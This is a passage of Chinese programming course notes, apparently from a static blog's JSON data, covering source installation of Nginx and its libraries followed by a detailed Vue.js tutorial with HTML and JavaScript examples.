pcre-8.35.tar.gz # 3.进入pcre目录 [root@theo local]# cd pcre-8.35 # 4.配置 [root@theo pcre-8.35]#./configure # 5.编译安装 [root@theo pcre-8.35]# make &amp;&amp; make install 10.3 安装SSL库[root@theo pcre-8.35]# cd /usr/local [root@theo local]# wget http://www.openssl.org/source/openssl-1.0.1j.tar.gz [root@theo local]# tar -zxvf openssl-1.0.1j.tar.gz [root@theo local]# cd openssl-1.0.1j [root@theo openssl-1.0.1j]# ./config [root@theo openssl-1.0.1j]# make &amp;&amp; make install 10.4 安装zlib库[root@theo openssl-1.0.1j]# cd /usr/local [root@theo local]# wget http://zlib.net/zlib-1.2.11.tar.gz [root@theo local]# tar -zxvf zlib-1.2.11.tar.gz [root@theo local]# cd zlib-1.2.11 [root@theo zlib-1.2.11]# ./configure [root@theo zlib-1.2.11]# make &amp;&amp; make install 10.5 安装Nginx[root@theo zlib-1.2.11]# cd /usr/local [root@theo local]# wget http://nginx.org/download/nginx-1.16.1.tar.gz [root@theo local]# tar -zxvf nginx-1.16.1.tar.gz [root@theo local]# mkdir -p server/nginx [root@theo local]# cd nginx-1.16.1 [root@theo nginx-1.16.1]# ./configure --prefix=/usr/local/server/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/pcre-8.35 [root@theo nginx-1.16.1]# make &amp;&amp; make install # 如果在配置过程中出现了以下错误: ./configure: error: SSL modules require the OpenSSL library. You can either do not enable the modules, or install the OpenSSL library into the system, or build the OpenSSL library statically from the source with nginx by using --with-openssl=&lt;path&gt; option. # 执行：yum -y install openssl openssl-devel 10.6 配置Nginx vim /usr/local/server/nginx/conf/nginx.conf 10.7 启动Nginx 10.8 访问Nginxhttp://47.96.11.185/imgs/a.jpg","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"Vue","slug":"04-锋迷商城-随堂笔记/04-vue/VUE","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:18:47.846Z","comments":true,"path":"posts/12.html","link":"","permalink":"https://bigbug888.github.io/posts/12.html","excerpt":"","text":"一、VUE简介1.1 使用jQuery的复杂性问题 使用jQuery进行前后端分离开发，既可以实现前后端交互（ajax）,又可以完成数据渲染； 存在的问题：jQuery需要通过HTML标签拼接、DOM节点操作完成数据的显示，开发效率低且容易出错，渲染效率较低 vue 是继jQuery之后的又一优秀的前端框架：专注于前端数据的渲染——语法简单、渲染效率高 1.2 VUE简介1.2.1 前端框架 前端三要素：HTML、CSS、JavaScript HTML决定网页结构 CSS决定显示效率 JavaScript决定网页功能（交互、数据显示） UI框架： Bootstrap amazeUI Layui JS框架： jQuery（jQuery UI） React angular nodejs—-后端开发 vue 集各种前端框架的优势发展而来 1.2.2 MVVM 项目结构经历的三个阶段： 后端MVC 我们就可以理解为单体架构，流程控制是由后端控制器来完成 前端MVC 前后端分离开发，后端只负责接收响应请求 MVVM 前端请求后端接口，后端返回数据，前端接收数据，并将接收的数据设置“VM”,HTML从vm取值 M model 数据模型 指的是后端接口返回的数据 V view 视图 VM ViewModel 视图模型 数据模型与视图之间的桥梁，后端返回的model转换前端所需的vm，视图层可以直接从vm中提取数据 MVC MVVM 二、 vue的入门使用 Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合. 2.1 vue的引入 离线引用：下载vue的js文件，添加到前端项目，在网页中通过script标签引用vue.js文件 CDN引用： &lt;script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"&gt;&lt;/script&gt; 2.2 入门案例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;&lt;/title&gt; &lt;script src=\"js/vue.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; 从vm中获取的数据为：{{str}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str:\"从前有座山\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 三、 vue的语法3.1 基本类型数据和字符串{{code}} {{str}} ------------------------- data:{ code:10, str:\"test\" } 3.2 对象类型数据 支持ognl语法 {{stu.stuNum}} {{stu.stuName}} ----------------------------- data{ stu:{ stuNum:\"100001\", stuName:\"张三\", stuGender:\"M\", stuAge:20 } } 3.3 条件 v-if&lt;label v-if=\"stu.stuGender=='M'\"&gt;男&lt;/label&gt;&lt;br/&gt; ------------------------------------------------------- data:{ stu:{ stuNum:\"100001\", stuName:\"张三\", stuGender:\"M\", stuAge:20 } } 3.4 循环 v-for&lt;table border=\"1\" cellspacing=\"0\" width=\"400\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;/tr&gt; &lt;tr v-for=\"s,index in stus\"&gt; &lt;td&gt;{{index+1}}&lt;/td&gt; &lt;td&gt;{{s.stuNum}}&lt;/td&gt; &lt;td&gt;{{s.stuName}}&lt;/td&gt; &lt;td&gt; &lt;label v-if=\"s.stuGender == 'M'\"&gt;男&lt;/label&gt; &lt;label v-if=\"s.stuGender == 'F'\"&gt;女&lt;/label&gt; &lt;/td&gt; &lt;td&gt;{{s.stuAge}}&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; --------------------------------------------------------------------- data:{ stus:[ { stuNum:\"100001\", stuName:\"张大三\", stuGender:\"M\", stuAge:23 }, { stuNum:\"100002\", stuName:\"张中三\", stuGender:\"M\", stuAge:22 }, { stuNum:\"100003\", stuName:\"张小三\", stuGender:\"F\", stuAge:20 } ] } 3.5 v-bind绑定标签属性 v-bind: 可简写为 : &lt;input type=\"text\" v-bind:value=\"str\"/&gt; &lt;img :src=\"stu.stuImg\"/&gt; ------------------------------------ data{ str:\"从前有座山\", stu:{ stuImg:\"img/01.jpg\" } } 3.6 表单标签的双向绑定 v-model 只能使用在表单输入标签 v-model:value 可以简写为 v-model &lt;input type=\"text\" v-model:value=\"str\"/&gt; &lt;input type=\"text\" v-model=\"str\"/&gt; ------------------------------------ data{ str:\"从前有座山\" } 四、vue实例 每个使用vue进行数据渲染的网页文档都需要创建一个Vue实例 —— ViewModel 4.1 Vue实例的生命周期 vue实例生命周期——vue实例从创建到销毁的过程 创建vue实例（初始化data、加载el） 数据挂载（将vue实例data中的数据渲染到网页HTML标签） 重新渲染（当vue的data数据发生变化，会重新渲染到HTML标签） 销毁实例 4.2 钩子函数 为了便于开发者在vue实例生命周期的不同阶段进行特定的操作，vue在生命周期四个阶段的前后分别提供了一个函数，这个函数无需开发者调用，当vue实例到达生命周期的指定阶段会自动调用对应的函数。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;label v-once&gt;{{str}}&lt;/label&gt;&lt;br/&gt; &lt;label&gt;{{str}}&lt;/label&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{}, beforeCreate:function(){ //1.data初始化之前执行，不能操作data }, created:function(){ //2.data初始化之后执行，模板加载之前，可以修改/获取data中的值 console.log(this.str); //this.str = \"山里有座庙\"; }, beforeMount:function(){ //3.模板加载之后，数据初始渲染（挂载）之前，可以修改/获取data中的值 //this.str = \"庙里有口井\"; }, mounted:function(){ //4.数据初始渲染（挂载）之后，可以对data中的变量进行修改，但是不会影响v-once的渲染 //this.str = \"井里有只蛙\"; }, beforeUpdate:function(){ //5.数据渲染之后，当data中的数据发生变化触发重新渲染，渲染之前执行此函数 // data数据被修改之后，重新渲染到页面之前 console.log(\"-----\"+this.str); this.str = \"从前有座山2\"; }, updated:function(){ //6.data数据被修改之后，重新渲染到页面之后 //this.str = \"从前有座山3\"; }, beforeDestroy:function(){ //7.实例销毁之前 }, destroyed:function(){ //8.实例销毁之后 } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 五、计算属性和侦听器5.1 计算属性 data中的属性可以通过声明获得，也可以通过在computed通过计算获得 特性：计算属性所依赖的属性值发生变化会影响计算属性的值同时发生变化 示例 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"str1\"/&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str2\"/&gt;&lt;br/&gt; {{str3}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str1:\"千锋\", str2:\"武汉\" }, computed:{ str3:function(){ return this.str1+this.str2; } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 5.2 侦听器 侦听器，就是data中属性的监听器，当data中的属性值发生变化就会触发侦听器函数的执行 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"str1\"/&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str2\"/&gt;&lt;br/&gt; {{str3}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str1:\"千锋\", str2:\"武汉\", str3:\"千锋武汉\" }, watch:{ str1:function(){ this.str3 = this.str1 +this.str2; }, str2:function(){ this.str3 = this.str1 +this.str2; } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 六、class与style绑定 我们可以使用mustache语法将vue中data的数据绑定到HTML标签及标签的属性，如何将data中的值绑定到标签的class及style属性呢？ 6.1 class绑定&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; .mystyle1{ width: 200px; height: 100px; background: orange; } .mystyle3{ width: 200px; height: 100px; background: black; } .my-style2{ border-radius: 10px; } &lt;/style&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--如果b1为true就加载 mystyle1；如果b2为true，则加载my-style2--&gt; &lt;div :class=\"{mystyle1:b1,'my-style2':b2}\"&gt;&lt;/div&gt; &lt;!--为class属性加载多个样式名 --&gt; &lt;div :class=\"[chooseStyle1,chooseStyle2]\"&gt;&lt;/div&gt; &lt;!--如果b3为true，则class='mystyle3'; 否则class='mystyle1' 如果在三目运算中使用样式名则需加单引号，不加单引号则表示从data变量中获取样式名--&gt; &lt;div :class=\"[b3 ? 'mystyle3' : 'mystyle1']\"&gt;&lt;/div&gt; &lt;div :class=\"[b3 ? chooseStyle3 : chooseStyle1]\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ b1:true, b2:true, b3:false, chooseStyle1:\"mystyle1\", chooseStyle2:\"my-style2\", chooseStyle3:\"mystyle3\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 6.2 style绑定&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--当使用v-bind绑定内联样式时： 1. 使用{}定义style样式，才能获取data中的值，{}要遵循JSON格式 2. {}中不在使用style样式属性名“font-size”,而要使用对应的js属性名 border-style-width --- borderStyleWidth --&gt; &lt;div v-bind:style=\"{color: colorname,fontSize: fontsize+'px' }\"&gt;WH2010&lt;/div&gt; &lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的字符串--&gt; &lt;div v-bind:style=\"mystyle1\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的对象--&gt; &lt;div v-bind:style=\"mystyle2\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;!--可以在同一个style上通过数组引用多个内联样式的对象--&gt; &lt;div v-bind:style=\"[mystyle2,mystyle3]\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ colorname:\"green\", fontsize:30, mystyle1:\"color:orange;font-size:45px\", mystyle2:{ color:\"blue\", fontSize:\"40px\" }, mystyle3:{ textShadow:\"orange 3px 3px 5px\" } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 七、条件与列表渲染7.1 条件渲染7.1.1 v-if 在html标签可以添加v-if指令指定一个条件，如果条件成立则显示此HTML标签，如果不成立则不显示当前标签； 条件可以是一个表达式也可以是一个具体的bool类型值 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h3 v-if=\"b\"&gt;从前有座山&lt;/h3&gt; &lt;h3 v-if=\"code == 1\"&gt;从前有座山&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:2, b:false } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 7.1.2 v-else&lt;div id=\"container\"&gt; &lt;!--v-else标签需要紧跟在v-if的标签之后，中间不能有其他标签--&gt; &lt;h3 v-if=\"code == 1\"&gt;从前有座山&lt;/h3&gt; &lt;h3 v-else&gt;山里有座庙&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:1 } }); &lt;/script&gt; 7.1.3 v-else-if&lt;div id=\"container\"&gt; &lt;h3 v-if=\"code &gt;= 90\"&gt;优秀&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 80\"&gt;良好&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 70\"&gt;中等&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 60\"&gt;及格&lt;/h3&gt; &lt;h3 v-else&gt;不想理你&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:85 } }); &lt;/script&gt; 7.1.4 v-show 从功能上将v-show和v-if作用是相同的，渲染过程有区别 v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。 v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。 相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。 一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。 7.2 列表渲染 将集合数据以表格、列表的形式显示 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;ul&gt; &lt;li v-for=\"c in categories\"&gt; &lt;a :href=\"'query?cid='+c.cid\"&gt;{{c.cname}}&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;table class=\"table table-bordered\"&gt; &lt;tr&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;照片&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;template v-for=\"s,index in stus\"&gt; &lt;tr :id=\"'tr'+s.stuNum\"&gt; &lt;td&gt;{{s.stuNum}}&lt;/td&gt; &lt;td&gt; &lt;img height=\"30\" :src=\"s.stuImg\"/&gt; &lt;/td&gt; &lt;td&gt;{{s.stuName}}&lt;/td&gt; &lt;td&gt; &lt;!--{{s.stuGender=='M'?'男':'女'}}--&gt; &lt;img v-if=\"s.stuGender=='M'\" src=\"img/m.bmp\"&gt; &lt;img v-else src=\"img/f.bmp\"&gt; &lt;/td&gt; &lt;td&gt;{{s.stuAge}}&lt;/td&gt; &lt;td&gt; &lt;a class=\"btn btn-danger btn-xs\" :href=\"'stu/delete?cid='+s.stuNum\"&gt;删除&lt;/a&gt; &lt;a class=\"btn btn-success btn-xs\" :href=\"'stu/update?cid='+s.stuNum\"&gt;修改&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/template&gt; &lt;/table&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ categories:[ { cid:1, cname:\"华为\" }, { cid:2, cname:\"小米\" }, { cid:3, cname:\"OPPO\" }, { cid:4, cname:\"VIVO\" } ], stus:[ { stuNum:\"10010\", stuImg:\"img/01.jpg\", stuName:\"Tom\", stuGender:\"M\", stuAge:20 }, { stuNum:\"10011\", stuImg:\"img/02.jpg\", stuName:\"LiLei\", stuGender:\"M\", stuAge:20 }, { stuNum:\"10012\", stuImg:\"img/03.jpg\", stuName:\"Lucy\", stuGender:\"F\", stuAge:20 }, { stuNum:\"10013\", stuImg:\"img/04.jpg\", stuName:\"Polly\", stuGender:\"F\", stuAge:20 } ] } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 八、事件处理 在使用vue进行数据渲染时，如果使用原生js事件绑定(例如onclick)，如果需要获取vue实例中的数据并传参则需要通过拼接来完成 vue提供了v-on指令用于绑定各种事件（v-on:click），简化了从vue取值的过程，但是触发的方法需要定义在vue实例的 methods中 &lt;button type=\"button\" v-on:click=\"doDelete(s.stuNum,s.stuName)\"&gt;删除&lt;/button&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{}, methods:{ doDelete:function(snum,sname){ console.log(\"----delete:\"+snum+\" \"+sname) } } }); &lt;/script&gt; v-on:clicl可以缩写为@click 8.1 使用JS函数传值&lt;button type=\"button\" class=\"btn btn-danger btn-xs\" v-on:click=\"doDelete(s.stuNum,s.stuName)\"&gt;删除&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doDelete:function(snum,sname){ console.log(\"----delete:\"+snum+\" \"+sname) } } }); &lt;/script&gt; 8.2 使用dataset对象传值&lt;button type=\"button\" class=\"btn btn-success btn-xs\" @click=\"doUpdate\" :data-snum=\"s.stuNum\" :data-sname=\"s.stuName\" :data-simg=\"s.stuImg\"&gt;修改&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doUpdate:function(event){ //如果v-on绑定的js函数没有参数，调用的时候可以省略()，同时可以给js函数一个event参数(事件对象) // 1. event 表示触发当前函数的事件 // 2. event.srcElement 表示发生事件的元素---修改按钮 // 3. event.srcElement.dataset 表示按钮上绑定的数据集（data-开头的属性） console.log(\"-----update\") var stu = event.srcElement.dataset; } } }); &lt;/script&gt; 8.3 混合使用 $event &lt;button type=\"button\" class=\"btn btn-danger btn-xs\" v-on:click=\"doDelete(s.stuNum,s.stuName,$event)\":data-simg=\"s.stuImg\"&gt;删除&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doDelete:function(snum,sname,event){ console.log(\"----delete:\"+snum+\" \"+sname) console.log(event.srcElement.dataset); } } }); &lt;/script&gt; 8.4 事件修饰符 当使用v-on进行事件绑定的时候，可以添加特定后缀，设置事件触发的特性 8.4.1 事件修饰符使用示例&lt;button type=\"submit\" @click.prevent=\"事件函数\"&gt;测试&lt;/button&gt; 8.4.2 事件修饰符.prevent 消除元素的默认事件 &lt;div id=\"container\"&gt; &lt;form action=\"https://www.baidu.com\"&gt; &lt;button type=\"submit\" class=\"btn btn-success btn-xs\" @click.prevent=\"test\"&gt;测试&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ }, methods:{ test:function(){ console.log(\"---test\"); } } }); &lt;/script&gt; .stop 阻止事件冒泡（阻止子标签向上冒泡） .self 设置只能自己触发事件（子标签不能触发） &lt;div id=\"container\"&gt; &lt;div style=\"width: 200px; height: 200px; background: red;\" @click.self=\"method1\"&gt; &lt;div style=\"width: 150px; height: 150px; background: green;\" @click=\"method2\"&gt; &lt;button type=\"button\" @click.stop=\"method3\"&gt;测试&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ }, methods:{ method1:function(){ alert(\"1\"); }, method2:function(){ alert(\"2\"); }, method3:function(){ alert(\"3\"); } } }); &lt;/script&gt; .once 限定事件只触发一次 8.4.3 按键修饰符 按键修饰符就是针对键盘事件的修饰符，限定哪个按键会触发事件 &lt;input type=\"text\" @keyup.enter=\"method4\"/&gt; .enter .tab .delete (捕获“删除”和“退格”键) .esc .space .up .down .left .right 除了以上vue提供按钮的别名之外，我们还可以根据键盘为按键自定义别名 键盘码 示例： &lt;div id=\"container\"&gt; &lt;!--2.使用自定义的按键别名aaa作为修饰符--&gt; &lt;input type=\"text\" @keyup.aaa=\"method4\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //1.为按键J定于别名为 aaa Vue.config.keyCodes.aaa =74; var vm = new Vue({ el:\"#container\", data:{}, methods:{ method4:function(){ alert(\"4\"); } } }); &lt;/script&gt; 8.4.3 系统修饰符 组合键 示例 ctrl+j触发事件 &lt;div id=\"container\"&gt; &lt;input type=\"text\" @keyup.ctrl.j=\"method4\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.keyCodes.j =74; var vm = new Vue({ el:\"#container\", data:{}, methods:{ method4:function(){ alert(\"4\"); } } }); &lt;/script&gt; .ctrl .alt .shift .meta windows键 九、表单输入绑定 表单输入绑定，即双向绑定：就是能够将vue实例的data数据渲染到表单输入视图（input\\textarea\\select），也能够将输入视图的数据同步更新到vue实例的data中 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--文本输入框、密码输入框--&gt; &lt;input type=\"text\" v-model=\"text\"/&gt;&lt;br/&gt; &lt;input type=\"password\" v-model=\"pwd\"/&gt;&lt;br/&gt; &lt;!--单选按钮--&gt; &lt;input type=\"radio\" v-model=\"opt1\" value=\"A\"/&gt;A 3 &lt;input type=\"radio\" v-model=\"opt1\" value=\"B\"/&gt;B 4 &lt;input type=\"radio\" v-model=\"opt1\" value=\"C\"/&gt;C 5 &lt;input type=\"radio\" v-model=\"opt1\" value=\"D\"/&gt;D 6 &lt;br/&gt; &lt;!--复选框，绑定的是一个数组--&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"篮球\"/&gt;篮球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"足球\"/&gt;足球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"羽毛球\"/&gt;羽毛球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"乒乓球\"/&gt;乒乓球&lt;br/&gt; &lt;!--下拉菜单select：绑定一个字符串--&gt; &lt;select v-model=\"city\"&gt; &lt;option value=\"BJ\"&gt;北京&lt;/option&gt; &lt;option value=\"SH\"&gt;上海&lt;/option&gt; &lt;option value=\"GZ\"&gt;广州&lt;/option&gt; &lt;option value=\"SZ\"&gt;深圳&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;!--下拉菜单select：如果有multiple表示可多选，需要绑定一个数组--&gt; &lt;select v-model=\"cities\" multiple&gt; &lt;option value=\"BJ\"&gt;北京&lt;/option&gt; &lt;option value=\"SH\"&gt;上海&lt;/option&gt; &lt;option value=\"GZ\"&gt;广州&lt;/option&gt; &lt;option value=\"SZ\"&gt;深圳&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;测试&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ text:\"aaa\", pwd:\"111111\", opt1:\"C\", opt2:[\"篮球\",\"羽毛球\"], city:\"SZ\", cities:[\"BJ\",\"SZ\"] }, methods:{ doSearch:function(){ alert(vm.cities); } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 十、vue使用案例10.1 接口说明 接口名称 功能描述 根据关键字搜索音乐信息 请求URL http://47.96.11.185:9999/music/search 请求方式 GET | POST 请求参数 s string [必须] 搜索关键字limit int [可选] 返回的搜索结果的条数，默认为10type int [可选] 搜索类型(1单曲 10歌单)，默认为1offset int [可选] 搜索结果的偏移 返回结果 10.2 如何部署jar文件java -jar music-1.0.0.jar 10.3 案例目标请大家根据以上接口实现搜索和列表显示功能 10.4 案例实现10.4.1 音乐搜索10.4.2 音乐播放 在music.html中定义音频播放器(定义在vue的容器之外) &lt;audio controls style=\"width:100%\" src=\"\" id=\"player\"&gt;&lt;/audio&gt; 给播放按钮绑定点击事件触发的函数doPlay &lt;button type=\"button\" class=\"btn btn-success btn-xs\" @click=\"doPlay\" :data-mid=\"song.id\"&gt;播放&lt;/button&gt; 在doPlay中执行播放 &lt;script type=\"text/javascript\"&gt; var player = document.getElementById(\"player\"); var vm = new Vue({ el:\"#container\", data:{ keyword:\"张韶涵\", songs:[], currentid:0 }, methods:{ doSearch:function(){ console.log(vm.keyword); $.get(\"http://localhost:9999/music/search\",{s:vm.keyword,limit:15,offset:0},function(res){ console.log(res); if(res.code==200){ //获取此关键词搜索的总记录数 var count = res.result.songCount; //获取音乐集合 var arr = res.result.songs; vm.songs = arr; }else{ vm.songs = data; } },\"json\"); }, doPlay:function(event){ vm.currentid = event.srcElement.dataset.mid; //网易云音乐播放地址： http://music.163.com/song/media/outer/url?id=songId player.src = \"http://music.163.com/song/media/outer/url?id=\"+vm.currentid; player.play(); } } }); &lt;/script&gt; 10.4.3 播放暂停切换十一、组件11.1 组件介绍及示例 组件，就是将通用的HTML模块进行封装——可复用 11.1.1 组件注册 将通用的HTML模块封装注册到vue中 Vue.component(\"header-bar\",{ }); 11.1.2 组件引用 定义组件需要依赖vue.js，在引用自定义组件的js文件之前要先引用vue.js 组件的引用必须在vue实例el指定的容器中 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar&gt;&lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.2 组件注册11.2.1 自定义组件的结构 data 定义组件的模板渲染的数据 template 组件的HTML模块（HTML标签\\css样式） methods 定义组件中的标签事件绑定的JS函数 Vue.component(\"header-bar\",{ data:function(){ //组件中的data是通过函数返回的对象 return { title:\"Java2010电商平台\" }; }, template:`&lt;div style=\"width: 100%; height: 80px; background: lightyellow;\"&gt; &lt;table width=\"100%\"&gt; &lt;tr&gt; &lt;td width=\"200\" align=\"right\" valign=\"middle\"&gt; &lt;img src=\"img/logo.png\" height=\"80\"&gt; &lt;/td&gt; &lt;td&gt; &lt;label style=\"color: deepskyblue;font-size:32px; font-family: 华文行楷; margin-left: 30px;\"&gt; {{title}} &lt;/label&gt; &lt;/td&gt; &lt;td&gt; &lt;button @click=\"test\"&gt;组件中的按钮&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;`, methods:{ test:function(){ alert(\"组件中定义的函数\"); } } }); 11.2.2 组件的封装 将模版中的css样式提出取来，单独定义到css文件存储在css目录 